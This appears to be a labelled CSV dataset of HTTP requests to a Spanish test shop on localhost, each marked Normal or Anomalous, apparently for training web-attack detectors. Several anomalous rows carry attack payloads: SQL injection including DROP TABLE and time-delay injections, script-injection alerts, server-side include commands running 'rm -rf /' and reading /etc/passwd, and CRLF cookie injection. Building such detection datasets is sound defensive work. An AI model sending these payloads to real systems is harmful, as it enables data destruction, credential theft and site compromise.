raw_log,classification
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Queso+Manchego&precio=39%2F&cantidad=18&B1=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=kara-lyn&password=887piT1&nombre=Malaqu%EDas&apellidos=Pinazo+Paillalef&email=gracindo%40ajuntamentbcn2-0.jp&dni=87058281S&direccion=Froilan+De+La+Serna%2C+185+&ciudad=Prullans&cp=37216&provincia=Palencia&ntc=2780139956948714&B1=Registrar,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mayi&password=r75ar&nombre=Alenka&apellidos=Cejas+Torra&email=kobe%40techdata.com.pg&dni=75925253E&direccion=Calle+Casas+Viejas+73+&ciudad=Torres+de+Cotillas%2C+Las&cp=08731&provincia=Navarra&ntc=1803474685764017%27INJECTED_PARAM&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Vino+Rioja&precio=39&cantidad=10&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/samples/dbsamp/dbsamp3.htm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=damiano&password=EsCoGiDAMeNte&nombre=Vilmar&apellidos=Mateu+Bernaus&email=sheybal%40cirugiaparpado.no&dni=75586196P&direccion=Travesia+Nardo+124%2C+7E&ciudad=Torre+de%2F+Mi*guel+Sesmer%2Bo&cp=42311&provincia=C%E1ceres&ntc=6955835443751937&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=celso&pwd=desvarar&remember=on%2F&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=peers&password=at222a1&nombre=Cipriana&apellidos=Serradell&emailA=cornthwaite%40clichotel.do&dni=19247264J&direccion=C%2F+Joventut%2C+182%2C+&ciudad=Alegia&cp=31510&provincia=Salamanca&ntc=8765134980053757&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gwenny&password=BOCana%24da&nombre=Danimiro&apellidos=Prosd%F3cimo+Surinyac&email=maren-bufford4%40fruteriacartaya.yu&dni=04212893Y&direccion=C%2F+Galicia%2C+180%2C+&ciudad=Robleda&cp=06440&provincia=C%F3rdoba&ntc=1856004857366548&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=2,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=1331&B1=Confirmar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85%2F&cantidad=60&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%257C HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=du-tuan&password=azadonad%3Fa&nombre=Yessica&apellidos=Flo+Hosta&email=colliti.shale%40ropadegolf.com.dd&dni=92937803R&direccion=Paseo+Arco+Del+Ladrillo+48+10%3FH&ciudad=Fuente+de+Piedra&cp=19392&provincia=Segovia&ntc=0273416778128431&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=teed&password=6_u1l67ador&nombre=Omer&apellidos=Quirentes+Vallori&email=portet.olteanu%40pintandomucho.tv&dni=7A%279417AM&direccion=C%2F+Isidro+Polo%2C+0+13%3FC&ciudad=Utrillas&cp=02310&provincia=Barcelona&ntc=4326433486745952&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=knobloch6&password=B5i230a&nombre=Nahuel&apellidos=Arbona+Yaz%E1n&email=bruck7%40introito.cg&dni=85294407B&direccion=Pl.+La+Se%F1oria%2C+192+12E&ciudad=Valverde+del+Camino&cp=33746&provincia=Lleida&ntcA=7752606383220025&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1,Anomalous
GET http://localhost:8080/webapp/examples/simple.jsp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=torok&password=03f3so&nombre=Noel+Stefani&apellidos=Vilaseca+Regalado&email=howell%40zarasalud.mw&dni=17400980P&direccion=Duran+i+*Borrell%2C+22%2B+3%3FD&ciudad=Fontiveros&cp=49254&provincia=Guadalajara&ntc=4507218709160906&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=85&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=30&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&login=agata&pwd=alambrAda&remember=on&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precioA=85&cantidad=8&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=74&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pilcher&password=0int67no&nombre=%2500&apellidos=Sejas+Escriba&email=alfaro%40inventoscaseros.cat&dni=78802302R&direccion=Passatge+Centelles%2C+19+&ciudad=Coir%F3s&cp=03517&provincia=La+Rioja&ntc=4788743133970052&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4135&B1A=Pasar+por+caja HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%2F%2C*stellwag&password=dogal&nombre=Adelmo&apellidos=Jepus+Novas&email=cagney%40hiperespa%F1a.et&dni=99942317A&direccion=Carrer+Sant+Fruitos+1%2C+&ciudad=Riells+i+Viabrea&cp=29410&provincia=M%E1laga&ntc=4452881808901719&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=daugavie9&password=DesCERraJaR&nombre=Rayen&apellidos=Gor%2Fr%ED*n&email=klevenow%40yiutuve.org&dni=02007726X&direccion=Portal+Del+Rey+20+10-H&ciudad=Aliaga&cp=06458&provincia=Guip%FAzcoa&ntc=9898547003601125&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=1,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7011&B1=Pasar+por+caja HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/asf-logo-wide.old HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Jam%F3n+Ib%E9rico%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=24&B1=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=39&cantidad=64&B1=A%F1adir+al+carrito,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=wilson&password=mo8os7&nombre=Jaaziel&apellidos=Pirotto+Nin&email=carew1%40koinup.ni&dni=69309273S&direccion=Calle+Practicante+Calixto+Rodriguez+163%2C+&ciudad=Zael&cp=16582&provincia=A+Coru%F1a&ntc=6959239796912888&B1=Registrar,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=carissa&password=SUPeRsTici%F3N&nombre=Ildefonso&apellidos=Llach+Mund%F3&email=edmundsen%40sindns.info&dni=40146763X&direccion=Plza.+Arbizketa+129%2C+&ciudad=Sant+Jaume+de+Frontany%E0&cp=21291&provincia=Guadalajara&ntc=9173442177715818&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=85&cantidad=90&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lantz&password=5r32n7&nombre=Medey&apellidos=Rabascall&email=struchkova%40gestionsoftware.cl&dni=82160553E&direccion=C%2F+Gallarza%2C+147+&ciudad=Cantalejo&cp=43376&provincia=Lleida&ntc=6657407608418544&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ha*rmony&pwd=ZaRrAm%24pl%EDN&remember=on&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=mckillop&password=margraviato&nombre=Leonor&apellidos=Pantiga+Corredor&email=miranoa%40enla.web&dni=36674466T&direccion=Mencia+Calderon%2C+170%2C+13B&ciudad=Manzanares+de+Rioja&cp=05427&provincia=Vizcaya&ntc=465413385488172&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=correa&password=5orTeRa&nombre=Fructuosa&apellidos=Polloni+Homdedeu&email=berto%40sindualidad.dd&dni=49742539W&direccion=C%2F+Einstein%2C+147%2C+9%3FA&ciudad=Legazpi&cp=44349%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&provincia=Valencia&ntc=2169388539628734&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=7&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide.gif.bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=229&B1=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide.gif/.BAK HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&precio=5003&B1=Confirmar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%3Fgols*h%2Can&password=contrAamura&nombre=Nicasia&apellidos=Coyoma+Abia&email=padovani%40thequeenworm.mp&dni=78419891B&direccion=Avenida+Castilla-la+Mancha+187%2C+3-D&ciudad=Sagrada%2C+La&cp=09318&provincia=A+Coru%F1a&ntc=4808153993761167&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=chihhua&password=iRi4Ar&nombre=%2FVeanella&apellidos=Fonts+Westermeier&email=hemmings_vos%40programasalquilermaquinaria.ag&dni=55492932G&direccion=C%2F+Bazan+184+4%3FA&ciudad=Garcia&cp=10812&provincia=Soria&ntc=2183980302594165&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp.old HTTP/1.1,Anomalous
GET http://localhost:8080/msadc/msadcs.dll HTTP/1.1,Anomalous
GET http://localhost:8080/asf-logo-wide.gif HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=7656&B1=Confirmar,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidadA=34&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080.Old HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=beate&pwd=esp8rtillero&remember=off&B1=%2500 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=56&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
PUT http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=4014&B1=Pasar+por+caja,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=rube&pwd=enLuTadA&remember=off&B1=Entrar,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
GET http://localhost:8080/tienda1.OLD HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=strucche&password=corcheta&nombre=C%E1stulo&apellidos=Pelayo+Petit&email=baio%40misanimalesdomesticos.coop&dni=93042317A&direccion=Veracruz%2C+S%2FN+2%3FF&ciudad=Manzaneda&cp=40130&provincia=L%2F%2Blei%3Fda&ntc=6073015432494873&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=bonny&password=*sepultura&nombre=Ives&apellidos=Raurell&email=persky-scavran%40mystyleperfume.co&dni=92230868V&direccion=Pomponio+Mela+190%2C+11F&ciudad=%27OR%27a%3D%27a&cp=37488&provincia=Santa+Cruz+de+Tenerife&ntc=5805853159182957&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=8498&B1=Pasar+por+caja,Normal
GET http://localhost:8080/jstl-war/index.html HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=xiaojing&password=coNtRadiCha&nombre=Iara&apellidos=Noya+Driu&email=milton%40diagnosticoradiologico.asia&dni=97426856Y&direccion=C%2F+Fuente+Pista+De+Tenis%2C+164+&ciudad=Aliseda&cp=40560&provincia=Le%F3n&ntc=5798582876895008&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/4861362529278789730 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=bienek&pwd=memoriosaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=off&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1%257C,Anomalous
GET http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=jinsoo&password=hatera&nombre=Babeli&apellidos=Coca&email=mirren.light%40hipereuskadi.no&dni=55444039D&direccion=C%2F+Ciudad+Jardin+108+7-H&ciudad=Valles+de+Palenzuela&cp=22700&provincia=%C1vila&ntc=6005492859075787&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=keeler&password=g78e651no&nombre=Floro&apellidos=Fidalgo&email=mcintosh%40pavimentosalagon.gy&dni=55170412J&direccion=C%2F+Joaquin+Sorolla%2C+148+5%3FD&ciudad=Aben%F3jar&cp=47175&provincia=Salamanca&ntc=240796981547256A&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectasany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,Anomalous
GET http://localhost:8080/CFIDE/administrator/enter.cfm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp/6909030637832563290.jsp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=paddie&password=pU1ada&nombreA=Lebana&apellidos=Garriga+Faja&email=allaylis-lowler%40lasmilyuna.sh&dni=87878927K&direccion=Calle+Azuaga+S%2FN+5-A&ciudad=Torrefarrera&cp=18130&provincia=Cantabria&ntc=2426074122150919&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=widuch&password=7AM2R0%CD502&nombre=Aladino&apellidos=Iriarte+Porres&email=gahan_boorman%40eneltajo.tt&dni=93685529C&direccion=Pl.+Del+Mexuar%2C+179%2C+1-D&ciudadA=Ordizia&cp=26288&provincia=Soria&ntc=5513132638351756&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modoA=insertar&precio=1881&B1=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=prashant&password=l1n1sa&nombre=Grey&apellidos=Montaner+Espinosa&email=gempart.moor%40guejosgratis.br&dni=27979477T&direccion=Calle+La+Le%F1a+27+&ciudad=Collbat%F3&cp=17180&provincia=Girona&ntc=7582936564650481&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mitsui&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=7645B6096BW&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&loginA=ince&pwd=74oNc0&remember=on&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%257C HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=900&B1=Pasar+por+caja%27OR%27a%3D%27a HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=39&cantidad=27&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cyndi&password=suBurbICaRIo&nombre=Quimey&apellidos=M%FAzquiz+Metauten&email=mars%40visualreality.au&dni=05744913L&direccion=Urbaniz*acio%2Bn+Aguere+192%2C%2B+&ciudad=Orba&cp=40180&provincia=Cantabria&ntc=9263586426997442&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3245&B1=Confirmar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=hyatt&password=8c75ps8s&nombre=Raimundo&apellidos=Trave+Girard&email=graef%40softwaremasservicio.is&dni=70803791Q&direccion=Carrer+N%BA++224+S%2FN%2C+3C&ciudad=Cervera+del+Maestre&cp=09390&provincia=Ciudad+Real&ntc=0093197595343977&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Vino+Rioja&precio=39&cantidad=40&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/asf-logo-wide HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=2,Anomalous
PUT http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=rygwalsk&password=ve50able&nombre=Francisco&apellidos=Pallares+Milara&email=gozzi%40encuentrodominios.at&dni=51556666G&direccion=Pl.+Banco+196%2C+7G&ciudad=Corrales&cp=03187&provincia=La+Rioja&ntc=3169451354292215&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=*%2Fvander%27we&pwd=pazguat5&remember=off&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=whited&password=coyotera&nombre=L%3Feonora&apellidos=Tranwincky+Selman&email=griem%40bloger%F3tico.nz&dni=28828668P&direccion=Zenobia%2C+197+8G&ciudad=Cabra+del+Camp&cp=15350&provincia=Valencia&ntc=3322562441567993&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=abdel-az&password=berberisco&nombre=Zaqueo&apellidos=Cabada+Ferrus&email=gentry.gast%40luchalibremexicana.cat&dni=43141809L&direccion=General+Bravo%2C+189%2C+&ciudad=Collado+Mediano&cp=31281&provincia=Salamanca&ntc=2840005774765443&B1=Registrar,Normal
